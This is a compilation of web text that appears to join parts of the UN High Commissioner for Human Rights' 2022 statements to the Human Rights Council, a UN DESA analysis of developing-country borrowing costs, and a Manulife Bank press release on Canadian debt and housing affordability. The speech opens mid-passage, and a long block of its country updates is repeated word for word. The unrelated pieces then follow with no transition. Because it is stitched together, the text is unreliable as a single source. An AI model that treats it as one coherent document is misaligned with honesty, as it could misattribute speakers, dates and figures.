Since the recent unconstitutional changes of power in Burkina Faso, Chad, Guinea and Mali, we await reasonable transition roadmaps and election calendars to yield power to civilian-led Governments with democratic legitimacy. I urge inclusive transitions that address the wider grievances of the populations and build democratic societies grounded in accountability and rule of law.

In the Central African Republic and Mali my field offices have recorded a worsening human rights situation as state military operations have increased, including with the reported deployment of private military actors. In Burkina Faso, civilians are victims of attacks and threats posed by extremist armed group, as well as of national military and security operations with the support of the Volontaires pour la Defense de la Patrie, a pro-Government militia.

Regional partnerships and collective responses to security challenges and terrorism-related threats in the Sahel are crucial. I regret the paralysis of the G5 Sahel Joint Force stemming from Mali’s decision to withdraw from all G5 Sahel organs. My Office remains committed to support national and regional actors to protect civilians in the Sahel region and ensure accountability.

In addition to renewed escalations in human rights violations and abuses as part of the conflict in northern Ethiopia, I am concerned about reports of human rights violations and abuses in the Benishangul-Gumuz and Oromia regions, including attacks against civilians, arbitrary detentions and destruction of properties. Growing religious tensions in various cities signal the need to tackle the underlying issues.

In Yemen, in the context of grave food insecurity, the fragile truce which began on 2 April 2022 continues to hold and I call on all parties to agree to its extension and to work with the UN Special Envoy on implementing all its provisions. This was followed by a transfer of executive power to a Presidential Leadership Council which, regrettably, includes not a single woman. I urge this Council to also prioritise a peaceful end to the judiciary strike which has negatively affected due process safeguards

I also wish to draw attention to the impact of the war in Ukraine on those caught up in protracted conflicts in the region, including parts of the South Caucasus region, the Western Balkans as well as the Transnistria region in Moldova. I encourage stepped up engagement through existing negotiations to contribute to prevention, confidence-building and protection in the region.

And we observe worrying consequences on human rights as a result of economic and other crises in some countries.

For instance, in Sri Lanka, I urge the Government to ensure immediate relief for the most marginalized and vulnerable groups and to prioritise social protection as it negotiates a recovery plan. I hope efforts will focus on deeper institutional reforms to ensure greater transparency and accountability in governance, reduce inequalities and advance reconciliation and justice for all communities.

The growing poverty, inequality, food insecurity and reduced access to health care and other essential services in Lebanon are troubling. Following the recent elections, I call for the urgent formation of a new Government that can enact human rights-based reforms. I also call upon the authorities to urgently enable the resumption of the investigation into the Beirut port explosion – which took place almost two years ago - with a view to ensuring accountability.

I remain concerned by the likely human rights impact of the reported outbreak of COVID-19 in the Democratic People’s Republic of Korea (DPRK). In the absence of any vaccination rollout, the limited healthcare infrastructure and the precarious food situation, the impact, particularly on vulnerable populations, is likely to be severe. Once again, I urge the international community to relax sanctions to enable urgent humanitarian and COVID-related assistance and encourage the DPRK to open channels for humanitarian support, including the presence of UN staff.

For Angola and Kenya, I join the UN system in expressing hope for peaceful and inclusive elections, where Angolans and Kenyans can freely and safely exercise their rights and fundamental freedoms, without discrimination, as guaranteed by their Constitutions.

Excellencies,

I am increasingly alarmed by significant setbacks relating to women’s rights, particularly in the area of sexual and reproductive health and rights. Restrictive abortion laws and practical barriers pose a threat to human rights, with disproportionate impact on women with limited resources. Unsafe abortions are a leading – but preventable - cause of maternal morbidity and many times mortality. Sexual and reproductive health and rights are critical for women’s well-being and for development. I welcome the decision of the Colombian Constitutional Court in February to decriminalize abortion, following positive developments globally, including most recently in Argentina and Mexico regarding these rights.

This is a time for progress, not further restrictions on these essential rights, as is under consideration in the United States of America.

In my update to this Council in March, I stressed the disturbing trend of reduction of civic space, including attacks on human rights defenders and journalists, and undue restrictions on freedom of expression and of the media. These trends continue.

In Brazil, I am alarmed by threats against environmental human rights defenders and indigenous people, including exposure to contamination by illegal gold mining. Recent cases of police violence and structural racism are of concern, as are attacks against legislators and candidates, particularly those of African descent, women and LGBTI+ people, ahead of the general elections in October. I call on authorities to ensure respect for fundamental rights and independent institutions.

In the Russian Federation, the arbitrary arrest of a large number of anti-war protesters is worrying. New criminal law restrictions were introduced, including general prohibitions on the dissemination of information based on vague and ambiguous notions, including “false news” or “non-objective information”. I also regret the increase in censorship and restrictions on independent media.

In Tajikistan, due process standards must be respected in cases of alleged human rights violations against activists, journalists and bloggers. I encourage the government to seek constructive communication with all communities, secure freedom of expression for all and observe its international human rights commitments.

Excellencies,

It was once assumed that increased globalisation, which brought with it converging economic and technological interests, could shield us from division.

But we are experiencing the opposite.

We are witnessing deeper polarization, with global events and behaviour driving States further apart, with some even more emboldened in their positions, and others caught in the crossfire.

In such an environment dialogue stagnates.

The dialogue that is needed for real change to happen can only occur when challenges are pursued with a common purpose, focusing on what unites, rather than what divides us.

I urge us to marshal a greater sense of collective responsibility and ambition that puts people, their protection, and their rights first.

We can then move closer together, certain in our course of securing a life of dignity for all.

Distinguished President,

Excellencies,

As my term as High Commissioner draws to a close, this Council’s milestone fiftieth session will be the last which I brief. This Council, for all of the differences of its members, remains central to protecting and promoting the human rights that lie at the heart of our common humanity. It has proven its ability to do that, and I therefore encourage you all to continue to seek dialogue, to be willing to hear the other, to understand respective points of view and to actively work towards identifying common ground, as prerequisites to achieving durable solutions to the challenges that threaten us all.

This Council’s work is also the richer for the voices and involvement of civil society in all its diversity. I encourage the Council to preserve and enhance their unique contribution and participation in this forum.

I thank you.

Since we last gathered, the war in Ukraine continues to destroy the lives of many, causing havoc and destruction. The horrors inflicted on the civilian population will leave their indelible mark, including on generations to come.

Its social, economic and political ramifications ripple across the region and globally, with no end in sight.

A global food, fuel and finance crisis now risks plunging millions into food insecurity and poverty. 1.2 billion people live in countries that are severely exposed and vulnerable to all three dimensions of finance, food, and energy, simultaneously.

The World Food Programme estimates that the number of severely food insecure people is expected to grow from 276 million at the start of 2022 to 323 million in the course of the year.

According to the UN Global Crisis and Response Group the combination of higher food and energy prices, growing inflation, export restrictions, and tightening financial conditions will be devastating, in particular on the most vulnerable.

Inequalities between and within countries are skyrocketing, threatening COVID-19 recoveries, undermining progress in the implementation of the SDGs and slowing down climate action.

In the face of these multiple and intersecting challenges and rising global tensions, many people I meet are questioning not only their own futures, but the future of their societies, and of our globe.

I understand and share their concerns.

It is tempting to slip back into emergency mode and focus on putting out the first fires we see.

Yes, stronger, immediate action is needed to address the worst impacts and to limit human suffering.

But this is not sufficient.

We need to invest in addressing the conditions that provoke these crises.

I urge us, at precisely this moment of grave and profound threat, to pursue the path we had committed to in the wake of the COVID-19 pandemic.

We gathered in multilateral fora, in high level debates and donor meetings and spoke of global solutions and of putting people at the centre of our efforts. We committed ourselves to learning the lessons of the pandemic, and to recover better.

Eager to avoid the devastating consequences of the austerity that followed the 2008 financial crisis, the international community agreed to change course: building – together - transformative societies and towards greener economies that will be more resilient to crises.

We are now facing a vital test of that commitment. And we need to meet it.

The 2030 Agenda and the Paris Agreement must remain our blueprint for this ambition.

Within the eight years that remain we must take bold and urgent action to generate the transformative change that is needed to meet the Sustainable Development Goals.

That recognition has inspired Our Common Agenda and the Call to Action for human rights, in which the Secretary-General calls for a more networked and inclusive multilateralism, with actors joining forces to take on the global and interconnected challenges facing humanity.

In that spirit, and by drawing on the work of my office, allow me to highlight four areas of intervention that I hope can give us some direction in the face of the current crises.

First, we need to tackle inequality and discrimination.

We live in a world of staggering inequality, with one study estimating that global inequalities are about as great today as they were in the early 20th century.

The World Bank had projected 198 million more people living in extreme poverty during 2022 due to COVID-19. Global food prices alone are now estimated to add a further 65 million more people to that total.

While people across all income groups experienced losses during the pandemic, the poorest 20 percent experienced the steepest decline in incomes. And the poorest 40 percent haven’t started to recover their income losses.

And as the climate crisis continues to worsen for us all, it is again the poorest and most vulnerable who are bearing the harshest brunt.

People’s capacity to withstand yet another crisis is shrinking even further.

So we must further commit to redressing inequalities and discrimination. Today we know that greater equality can be an even more powerful engine than growth in reducing extreme poverty - a key goal of the 2030 Agenda.

My Office continues to expand its work to tackle inequality and discrimination, including by contributing to efforts to develop metrics beyond GDP, covering a range of inequalities, to measure progress. In a number of countries in Europe and the Americas, we have provided guidance and delivered training on anti-discrimination, minority and indigenous peoples rights to national authorities and UN entities.

We supported several countries to implement the Convention on the Rights of Persons with Disabilities including Georgia, Malawi, Mozambique and North Macedonia.

Real progress also depends on investigating and seeking justice for victims of discrimination. OHCHR has provided technical advice to enhance investigation protocols for gender-related killings of women, for instance in Chile and Honduras.

My Office has also contributed to the development of UN system-wide operational guidance to United Nations country level work on Leave No One Behind.

In Guinea-Bissau, together with the UN country team and the Government, we supported country-wide consultations, including with most disadvantaged groups, to ensure a human rights based approach, in the country’s first voluntary national review. My Office also supported the government of Serbia to mainstream the pledge to Leave No One Behind in Government policy and law making. The development of an Action Plan for the National Anti-Discrimination Strategy will draw on these efforts.

This brings me to the issue of disaggregated data. We cannot fix what we cannot see. Disaggregated data – critical to fighting inequalities, particularly in the current context - remains largely unavailable, especially regarding multiple and intersecting forms of discrimination.

There is an urgent need to strengthen statistical capacities of countries, including through increased international support. To that end, together with UNDP, my Office launched a joint project to strengthen UN country teams’ and NHRIs’ capacities on SDGs and prevention, including on disaggregated indicators and data on marginalized and vulnerable groups.

Second, national budgets should integrate human rights

If national budgets integrate States’ human rights obligations and are designed and implemented through a human rights-based approach, they can be a powerful lever for SDG progress. If they allocate sufficient resources to cover at least minimum essential levels of economic and social rights, we can deliver better development results.

Increasing national spending in social sectors, with a focus on accessibility, affordability, and quality of services and non-discrimination, particularly in the current context, will strengthen countries’ capacity to withstand shocks.

In this regard, my office is assisting countries to analyse their budgets, mobilise resources and create more fiscal space through a human rights lens.

For instance, through the UN Assistance Mission in Somalia, we helped assess the human rights compliance of a Government social protection cash transfer scheme. By drawing on UPR recommendations and inclusive consultations, proposals were made on mobilising domestic resources and through debt relief, with a view to leave no one behind.

Distinguished President,

The COVID-19 pandemic illustrated the stabilising force of social protection.

States adopted and financed innovative measures during the pandemic: they expanded coverage to informal workers, undocumented migrants and specific vulnerable populations; some integrated gender-responsive elements; some increased social protection benefits; and enacted laws to support employees and the self-employed.

These measures helped mitigate the socio-economic consequences of the pandemic.

And yet, today, over 4 billion people – more than half of the world`s population – still do not have access to any social protection. The UN Global Crisis and Response Group notes that developing countries miss $1.2 trillion per year to fill the social protection gap. The Group warns that unless social protection systems are adequately extended, people will be forced to make choices with severe impact on health, education and livelihoods.

Investing in social protection systems pays off in the short-term – by mitigating crisis – and in the long term, by nurturing human development and economic productivity, and fostering resilient institutions.

My Office has also supported States in their efforts in this regard.

In Timor Leste, together with the Government and ILO, we are exploring strategies to extend social protection coverage to women informal workers who are disproportionately affected by poverty.

My office also engaged with the South Africa Development Community in preparing its Model Law on Public Finance Management. We provided guidance on human rights-based social sector investment, and made recommendations on domestic resource mobilization options, including progressive taxation. This law can, we hope, serve as a benchmark for national Parliaments to reinforce their domestic legal framework on public financial management.

Countries have different capacities to invest in social protection. Therefore, more than ever we see the need for universal, comprehensive, and sustainable social protection systems as called for by human rights and by ILO recommendation 202.

Real progress can only occur if bold initiatives such as the proposed Global Fund for Social Protection can get off the ground.

Third, greater international cooperation and solidarity – including for debt relief - is needed now.

Without a significant boost in financial resources, we will not be able to achieve the SDGs.

The financing gap to achieve the SDGs has widened by over 70 per cent to an annual amount of $4.3 trillion.

This gap requires countries to mobilise public and private resources both domestically and internationally. Yet, spiralling debt and uncertain prospects of economic outlook – which will be further exacerbated in the current context - are holding many developing countries back. In 2022, it is estimated that these countries will require $311 billion to service public external debt, amounting to 13.6 per cent of government revenues.

Strengthening fiscal systems can certainly help raise additional domestic resources in all countries.

But for many countries at various levels of development, support is crucial.

Against this backdrop, I urge countries to remember our commitment to build forward better. This is the time to redouble efforts towards the O.7 per cent ODA target, armed with the knowledge that social spending today yields better societal outcomes tomorrow.

Lurking behind these finance concerns is a looming debt crisis, as the Secretary-General has warned .

So early and coordinated action of all, in particular international financial institutions, but also public and private creditors, is urgently needed.

International financing mechanisms to support strong national fiscal responses need to be fully funded and operationalised to meet the SDGs.

We also need to improve regulation of private sector actors such as ratings agencies. The UN Guiding Principles on business and human rights can serve as a robust guide for better aligning private investment with human rights and development objectives.

Finally, in order to shift towards a system with coordinated, comprehensive and sustainable debt solutions we need a reform of the international financial architecture.

And the role of international financial institutions is critical in supporting indebted countries. International human rights law provides the framework for this support, including how to mitigate retrogression in the fulfilment of rights. This involves ensuring that measures adopted do not result in discriminatory outcomes, in particular for the most marginalised.

And finally – civic space. I wish to conclude on what I think is the most crucial – and valuable – element of building resilience in times of crisis.

These are times for greater – not less - transparency and broader space for civic engagement and participation if we are serious about our commitments to build transformative and greener societies. A vibrant civic space is a lever of a stable, secure society. Yet, we continue documenting attacks against defenders and journalists, off-line and online, worldwide.

We cannot separate progress on economic goals, such as reducing poverty, from the rights of those who are the intended beneficiaries of those developments – including the right of those people to be heard.

I know and have seen that a life in dignity means securing the rights to work, to housing, to food, to water and sanitation.

I have also experienced, first-hand, that these rights can only be protected and fulfilled if people have the space to express their views and to demand the change they wish to see.

Together, these rights are the life blood of a vibrant, just and peaceful society.

By contrast, arresting those who protest peacefully, shutting down independent media, detaining lawyers - these are measures that not only violate rights, they eat away at the foundations of our prosperity and security.

The lessons here are clear, and are visible in the most powerful countries in the world, West and East. When we adopt laws that discriminate on the basis of religion, take shortcuts by profiling groups, give broad license to law enforcement without sufficient independent oversight, we damage not only our credibility but our stability. Terrorism is a scourge that unites us all in horror and commitment to combat it. But there can only be success in countering terrorism if, in doing so, we fully live up to the values we are defending.

I am proud to lead United Nations efforts, under the Secretary-General’s Call to Action, to make civil society participation more inclusive and safer. My Office led efforts to develop the UN system guidance note on civic space, and has supported human rights defenders networks in the Pacific and the Americas as well as the Women Human Rights Defenders networks in Ethiopia, Tanzania and elsewhere in East Africa.

Distinguished President,

Excellencies,

State responses to our growing challenges make or break the lived reality of human beings everywhere. Free and fair elections are critical, but people will measure the success of democracy by the extent to which they feel tangible differences in their lives.

Human rights reaffirm what economists are telling us – that progress on human rights and development make economic sense and deliver better outcomes in the medium and longer term.

Human rights are the tool to respond to political pressures for a quick fix.

And they are the tools that bring people together.

This is not a pretty path: open societies can be chaotic, with their flaws visible to all, and their results not immediate.

But it is a steady one. I hope we can unite on this path.

Distinguished President,

Excellencies,

Since I last updated you, I have undertaken two country visits – first to Afghanistan and most recently China. I will update you separately on Afghanistan on Wednesday.

During my visit to China I engaged in dialogue with the most senior leaders and officials at national level, and met with key representatives at regional level in Guangdong and Xinjiang.

We had discussions on specific human rights concerns, including human rights violations in the context of China’s policies for countering terrorism and safeguarding national security, protection of the rights of ethnic and religious minorities, judicial and legal protection including for women, human rights in the digital space, and business and human rights. I also raised concerns regarding the human rights situation of the Uyghur and other predominantly Muslim minorities in Xinjiang, including broad arbitrary detention and patterns of abuse, both in the VETC system and in other detention facilities. My Office’s assessment of the human rights situation in Xinjiang is being updated. It will be shared with the Government for factual comments before publication.

In addition, I raised human rights concerns in the Tibet and Hong Kong regions and discussed possible follow up actions with my Office.

I am also grateful for the informative and frank exchanges my team and I had with survivors and their family members and with civil society representatives, including outside of the country, whose information and perspectives are vital.

I have always emphasized the importance of dialogue in my engagement with all Member States, even on the most difficult issues. Going forward, we have agreed with the Government of China to hold an annual senior meeting on human rights and to continue exchanges on the abovementioned topics and specific human rights issues of concern. We are now elaborating concrete steps to put the agreements into action.

I now wish to update you on a few critical situations that call for urgent action. I will not touch on those situations that are the subject of separate discussions during this session: being, alongside Afghanistan, Iran, Myanmar, Nicaragua, Sudan, Syria, Ukraine and Venezuela.

I remain concerned about persistent impunity for violations of human rights.

In Haiti, impunity for corruption and human rights violations and abuses is a structural and longstanding challenge and one of the root causes of violence. The rapid deterioration of the human rights situation particularly in the metropolitan area of Port-au-Prince, results from violent clashes between heavy armed gangs rapidly expanding their control over the capital. Killings, kidnappings, sexual violence, including against children, are used to instil fear and displace the local population. Urgent, comprehensive action by the international community to tackle sexual violence and strengthen accountability mechanisms is necessary.

On her recent trip to South Sudan, while acknowledging some progress in the area of transitional justice, my Assistant Secretary-General for Human Rights called on the authorities to fight impunity, hold perpetrators of human rights violations to account and encouraged compensation to victims. The institutional vacuum in Abyei, impeding justice and accountability for violations, including those linked with killings of civilians in the context of intercommunal violence, continues to be worrying.

In Kazakhstan, I welcome investigations related to events that took place earlier this year, and call for ensuring that they are conducted thoroughly and independently, ensuring accountability.

I call on the Israeli authorities to open a criminal investigation into the killing of journalist Shireen Abu Akleh, to promptly make conclusions and findings public, and to hold perpetrators accountable. Under international human rights law, Israel should investigate and ensure appropriate accountability for every case of death and serious injury inflicted by Israeli Forces. The prevailing climate of impunity is fuelling further violations and violence - the now chronically high levels of killings and injuries of Palestinians, including children, by Israeli Forces in the occupied Palestinian territory have continued in the first six months of 2022.

I continue to have concerns with threats to the rule of law in several countries.

In Türkiye, the trials and prison sentences of activists and political opponents such as Osman Kavala, his seven co-defendants and Canan Kaftancıoğlu are of concern, as they appear to be targeted for their dissenting views. In the run-up to the elections, I urge special attention be paid to fundamental freedoms, political participation, due process, gender equality and addressing the rise in violence and anti-refugee sentiment.

I am worried about plans in the United Kingdom to replace one of the most important pieces of its human rights legislation – the Human Rights Act – with more limited legislation. I have concerns that repeal of key elements of the Human Rights Act would risk undermining access to justice and the right to effective remedies, introduce legal uncertainty, and increase costs.

In Guatemala, we observe, over a sustained period of time, a pattern of attacks against justice officials for their work involving emblematic cases of serious human rights violations, corruption and impunity. The state must guarantee the independence of judicial institutions and protection of justice officials.

In Mexico, I encourage the strengthening of civil institutions to establish an orderly plan to withdraw the military from public security tasks.

In Singapore, I am also concerned about the recent executions of two persons for drug related offences. More than 60 defendants are estimated to be on death row. With over 50 people facing this irreversible penalty for drug related offences, the vast majority of whom have exhausted appeals, I urge the Government to impose a moratorium on the death penalty, especially for non-violent, drug related crimes.

I commend the announcement of steps taken to abolish the death penalty in its entirety in the Central African Republic and to remove the mandatory death penalty in Malaysia, as well as the pledge made by the President of Zambia to abolish the death penalty. I urge all States that have not abolished it yet to join the global trend towards universal abolition, and to fully respect the right to life.

While recognising a State’s duty to address increasing criminality and ensure security I urge authorities to ensure measures are implemented in line with international human rights law.

For example, in El Salvador, the measures adopted under the state of emergency to fight gang violence together with subsequent criminal law amendments increase the risk of arbitrary detention and torture of detainees. More than 38,000 people have been arrested in the context of the state of emergency, raising concerns about respect for due process guarantees. Of particular concern are the at least 21 deaths in custody reported by official sources.

In Colombia, I welcome the peaceful and democratic character of the first round of the presidential elections, and trust a similar spirit will govern the run off, guaranteeing political rights. I urge effective implementation of the peace agreement, particularly the dismantling of groups responsible for the increase in violence. I welcome the significant transitional justice developments, including acknowledgement by military officials of responsibility for killings of civilians falsely presented as killed in combat. I call on the State to ensure independent transitional justice mechanisms and guarantee the protection of participating witnesses and victims.

Since the recent unconstitutional changes of power in Burkina Faso, Chad, Guinea and Mali, we await reasonable transition roadmaps and election calendars to yield power to civilian-led Governments with democratic legitimacy. I urge inclusive transitions that address the wider grievances of the populations and build democratic societies grounded in accountability and rule of law.

In the Central African Republic and Mali my field offices have recorded a worsening human rights situation as state military operations have increased, including with the reported deployment of private military actors. In Burkina Faso, civilians are victims of attacks and threats posed by extremist armed group, as well as of national military and security operations with the support of the Volontaires pour la Defense de la Patrie, a pro-Government militia.

Regional partnerships and collective responses to security challenges and terrorism-related threats in the Sahel are crucial. I regret the paralysis of the G5 Sahel Joint Force stemming from Mali’s decision to withdraw from all G5 Sahel organs. My Office remains committed to support national and regional actors to protect civilians in the Sahel region and ensure accountability.

In addition to renewed escalations in human rights violations and abuses as part of the conflict in northern Ethiopia, I am concerned about reports of human rights violations and abuses in the Benishangul-Gumuz and Oromia regions, including attacks against civilians, arbitrary detentions and destruction of properties. Growing religious tensions in various cities signal the need to tackle the underlying issues.

In Yemen, in the context of grave food insecurity, the fragile truce which began on 2 April 2022 continues to hold and I call on all parties to agree to its extension and to work with the UN Special Envoy on implementing all its provisions. This was followed by a transfer of executive power to a Presidential Leadership Council which, regrettably, includes not a single woman. I urge this Council to also prioritise a peaceful end to the judiciary strike which has negatively affected due process safeguards

I also wish to draw attention to the impact of the war in Ukraine on those caught up in protracted conflicts in the region, including parts of the South Caucasus region, the Western Balkans as well as the Transnistria region in Moldova. I encourage stepped up engagement through existing negotiations to contribute to prevention, confidence-building and protection in the region.

And we observe worrying consequences on human rights as a result of economic and other crises in some countries.

For instance, in Sri Lanka, I urge the Government to ensure immediate relief for the most marginalized and vulnerable groups and to prioritise social protection as it negotiates a recovery plan. I hope efforts will focus on deeper institutional reforms to ensure greater transparency and accountability in governance, reduce inequalities and advance reconciliation and justice for all communities.

The growing poverty, inequality, food insecurity and reduced access to health care and other essential services in Lebanon are troubling. Following the recent elections, I call for the urgent formation of a new Government that can enact human rights-based reforms. I also call upon the authorities to urgently enable the resumption of the investigation into the Beirut port explosion – which took place almost two years ago - with a view to ensuring accountability.

I remain concerned by the likely human rights impact of the reported outbreak of COVID-19 in the Democratic People’s Republic of Korea (DPRK). In the absence of any vaccination rollout, the limited healthcare infrastructure and the precarious food situation, the impact, particularly on vulnerable populations, is likely to be severe. Once again, I urge the international community to relax sanctions to enable urgent humanitarian and COVID-related assistance and encourage the DPRK to open channels for humanitarian support, including the presence of UN staff.

For Angola and Kenya, I join the UN system in expressing hope for peaceful and inclusive elections, where Angolans and Kenyans can freely and safely exercise their rights and fundamental freedoms, without discrimination, as guaranteed by their Constitutions.

Excellencies,

I am increasingly alarmed by significant setbacks relating to women’s rights, particularly in the area of sexual and reproductive health and rights. Restrictive abortion laws and practical barriers pose a threat to human rights, with disproportionate impact on women with limited resources. Unsafe abortions are a leading – but preventable - cause of maternal morbidity and many times mortality. Sexual and reproductive health and rights are critical for women’s well-being and for development. I welcome the decision of the Colombian Constitutional Court in February to decriminalize abortion, following positive developments globally, including most recently in Argentina and Mexico regarding these rights.

This is a time for progress, not further restrictions on these essential rights, as is under consideration in the United States of America.

In my update to this Council in March, I stressed the disturbing trend of reduction of civic space, including attacks on human rights defenders and journalists, and undue restrictions on freedom of expression and of the media. These trends continue.

In Brazil, I am alarmed by threats against environmental human rights defenders and indigenous people, including exposure to contamination by illegal gold mining. Recent cases of police violence and structural racism are of concern, as are attacks against legislators and candidates, particularly those of African descent, women and LGBTI+ people, ahead of the general elections in October. I call on authorities to ensure respect for fundamental rights and independent institutions.

In the Russian Federation, the arbitrary arrest of a large number of anti-war protesters is worrying. New criminal law restrictions were introduced, including general prohibitions on the dissemination of information based on vague and ambiguous notions, including “false news” or “non-objective information”. I also regret the increase in censorship and restrictions on independent media.

In Tajikistan, due process standards must be respected in cases of alleged human rights violations against activists, journalists and bloggers. I encourage the government to seek constructive communication with all communities, secure freedom of expression for all and observe its international human rights commitments.

Excellencies,

It was once assumed that increased globalisation, which brought with it converging economic and technological interests, could shield us from division.

But we are experiencing the opposite.

We are witnessing deeper polarization, with global events and behaviour driving States further apart, with some even more emboldened in their positions, and others caught in the crossfire.

In such an environment dialogue stagnates.

The dialogue that is needed for real change to happen can only occur when challenges are pursued with a common purpose, focusing on what unites, rather than what divides us.

I urge us to marshal a greater sense of collective responsibility and ambition that puts people, their protection, and their rights first.

We can then move closer together, certain in our course of securing a life of dignity for all.

Distinguished President,

Excellencies,

As my term as High Commissioner draws to a close, this Council’s milestone fiftieth session will be the last which I brief. This Council, for all of the differences of its members, remains central to protecting and promoting the human rights that lie at the heart of our common humanity. It has proven its ability to do that, and I therefore encourage you all to continue to seek dialogue, to be willing to hear the other, to understand respective points of view and to actively work towards identifying common ground, as prerequisites to achieving durable solutions to the challenges that threaten us all.

This Council’s work is also the richer for the voices and involvement of civil society in all its diversity. I encourage the Council to preserve and enhance their unique contribution and participation in this forum.

I thank you.

But not all countries and people have been impacted in the same way. As highlighted in the “2022 Financing for Sustainable Development Report” (FSDR), a financing divide is sharply curtailing the ability of many developing countries to respond to shocks and invest in recovery.

Shari Spiegel Chief, Policy Analysis & Development Branch - United Nations Department of Economic and Social Affairs Oliver Schwank Senior Economic Affairs Officer - United Nations Department of Economic and Social Affairs

In the wake of the COVID-19 pandemic, developed countries could finance massive fiscal response packages (worth 18 percentage points of GDP) at very low interest rates, backstopped by their central banks. Developing countries were more constrained. The poorest countries in particular were forced to cut spending in areas such as education and infrastructure, contributing to a more protracted crisis. Even before the fallout from the war in Ukraine, 1 in 5 developing countries was projected not to reach 2019 per capita income levels by the end of 2023, with investment rates not expected to return to pre-pandemic levels for at least two years.

This subdued investment recovery further widens large climate and Sustainable Development Goal (SDG) investment gaps. Yet, many countries are in no position to finance the necessary investment push. At the beginning of 2022, 3 in 5 of the poorest countries were at high risk of or already in debt distress, and 1 in 4 middle-income countries were at high risk of fiscal crisis. Rising energy and food prices due to the war in Ukraine have put additional pressures on fiscal and external balances of commodity importers, and tightening global financial conditions are raising risks of a systemic crisis. Debt sustainability concerns, which tend to arise at lower levels of debt in developing countries, translate into higher risk premia. Even in countries where debt is considered sustainable, the high cost of borrowing precludes needed investment.

Costs and terms of capital in developing countries

Developing countries’ average interest cost on external borrowing is three times higher than that of developed countries (Figure 1). In the low interest environment of the last decade, developed countries borrowed at an interest cost of an average of 1 percent. Least developed countries (LDCs), which have increasingly tapped international markets in recent years, borrowed at rates over 5 percent, with some countries paying over 8 percent. This has dragged up their average borrowing cost and translated into less fiscal space: LDCs dedicate an average of 14 percent of their domestic revenue to interest payments, compared to only around 3.5 percent in developed countries, despite the latter’s much larger debt stocks (Figure 2).

While this high cost of borrowing reflects higher perceived risks, there is evidence of an additional premium associated with sovereign borrowing. Over the last 200 years, the average annual return of foreign currency debt to investors has been around 7 percent, even after accounting for losses from defaults, exceeding the “risk free” return on U.S. and U.K. bonds by an average of 4 percentage points. Since the start of the emerging market ”bond finance era” around 1995, total returns to investors (net of losses from defaults) have been even higher, averaging almost 10 percent or around 6 percentage points over the risk-free rate—a historical high.*

Foreign currency bonds more than compensate investors for the risks they face—even through periods of repeated financial turmoil in developing countries. Indeed, external sovereign bonds have been the best performing asset class since 1995, outperforming other asset classes (such as equities or corporate bonds) even after adjusting for both defaults and risk (measured by market volatility). While sovereign spreads and risk premia may seem removed from people’s lives, in the case of sovereign debt, they have a direct impact. High investor returns equate to high borrowing costs for countries, diverting government expenditures from public investment and social services.

A multifaceted policy response

On the right terms, debt financing can enable countries to respond to emergencies and fund long-term investments. Productive investments in turn enhance growth and fiscal capacity, thus generating the resources to service debt sustainably. On the other hand, for countries with large debt overhangs, additional lending can be counterproductive, and debt relief and more grant financing indispensable. The challenge is to increase access to affordable long-term financing (and grants where appropriate) and to use proceeds productively. While there is no one solution to increase countries’ fiscal space, steps to do so include national actions, international public finance, and efforts to improve terms and reduce credit spreads associated with commercial borrowing. The “2022 Financing for Sustainable Development Report” puts forward recommendations in four areas to bridge the “great finance divide.”

First, countries should reduce risks and ensure that all financing is aligned with the SDGs and climate action. The efficiency of public investment is a key determinant of its growth and debt sustainability impact, and efficiency gaps remain sizeable in many countries. Linking public investment decisions to a medium-term fiscal and budget framework and debt management strategy—for example, in the context of an integrated national financing framework—can reduce the volatility of financing for capital expenditure. But national actions alone cannot solve systemic challenges.

Second, access to additional long-term affordable international public finance is critical. Official development assistance commitments must be met and Multilateral development banks’ (MDBs) lending should be expanded, including through capital increases and rechanneling of unused special drawing rights. MDBs themselves can improve lending terms, for example, through ultra-long-term loans and systematic use of state-contingent clauses in their own lending. In addition, the entire “system of development banks” should be strengthened: MDBs can extend capacity support to national institutions, and MDBs can in turn benefit from national banks’ knowledge of local markets.

Third, the international community can take measures to improve developing countries’ borrowing terms in markets. As global sources are dominant drivers of volatility of capital flows, addressing leverage and volatility in the international financial system is essential. Steps can also be taken to reduce the premia associated with the high cost of sovereign borrowing, such as by strengthening the information ecosystem and lengthening time horizons. Extending the horizon of credit ratings (which are often only for up to three years) and debt sustainability assessments would provide insights for long-term oriented investors.

Fourth, the international community urgently needs to step up efforts to resolve unsustainable debt situations. A multilateral debt relief and restructuring initiative may become necessary as global interest rates and risks of a systemic debt crisis rise. Systemic solutions should be pursued now, before large debt servicing payments come due in 2023. They should be discussed in an inclusive forum that brings together creditors and debtors. The United Nations could provide such a platform.

The survey takes a closer look at the impact of interest rates, inflation and housing prices on affordability in Canada

Over one in five Canadians of Canadians expect rising interest rates to have a significant negative impact on their overall mortgage, debt and financial situation.

As many as eighteen per cent of homeowners believe they can no longer afford the house they own.

Indebted Canadians are more likely to report that debt is causing them stress with close to half saying it is negatively impacting their mental health.

The housing market is out of reach for most – two-thirds do not view home ownership as being affordable, in their local community.

Nearly half of Canadians said they would struggle to handle unexpected expenses or are reconsidering summer vacation plans due to affordability concerns.

TORONTO, June 13, 2022 /CNW/ - Home ownership has been viewed as out of reach for many Canadians, for quite some time. In June 2021, Manulife Bank's Debt Survey revealed seven out of ten Canadians (71%) who do not own a home worry about saving up for one, including as many as two in five who worry a lot about this. In June 2022, the bi-annual Debt Survey reveals with interest rates, inflation and housing prices increasing, many who are already homeowners say if interest rates were to increase further, they would be forced to sell their home.

The affordable housing crisis has been well-documented for some time, and the renewed data from this year's Debt Survey highlights the impact interest rates, inflation and housing prices continue to have on Canadians' standard of living and livelihoods.

Among those surveyed, fewer than half feel prepared for rising interest rates (46%), inflation (42%), or housing prices (40%), which underscores how further increases in inflation, interest rates, and/or housing prices could be damaging for many Canadians.

""The survey revealed nearly one third of Canadians admit they don't understand how inflation or interest rates work, close to three in four do not have a written financial plan and almost half do not have a household budget, and that's particularly telling when reviewing the results of this season's Manulife Bank Debt Survey results,"" said Lysa Fitzgerald, Vice President of Sales, Manulife Bank. ""However, Canadians can gain confidence and control of their financial lives by acquiring a better understanding of the impact interest rates and inflation have on their personal finances, and taking that into account when creating their personal financial plans – whether that's independently or through the support of a certified financial advisor"".

Story continues

The survey responses also reveal four in five Canadians think there is an affordability crisis in Canada, a figure which suggests this is a major issue that might become worse if inflation continues its upward trajectory. In addition, over one in five Canadians expect rising interest rates to have a significant impact on their overall financial situation. Around one in five of those who are in debt expect rising interest rates to have a significant impact on their debt situation. And around one in five of those who have a mortgage expect rising interest rates to have a significant impact on their mortgage situation.

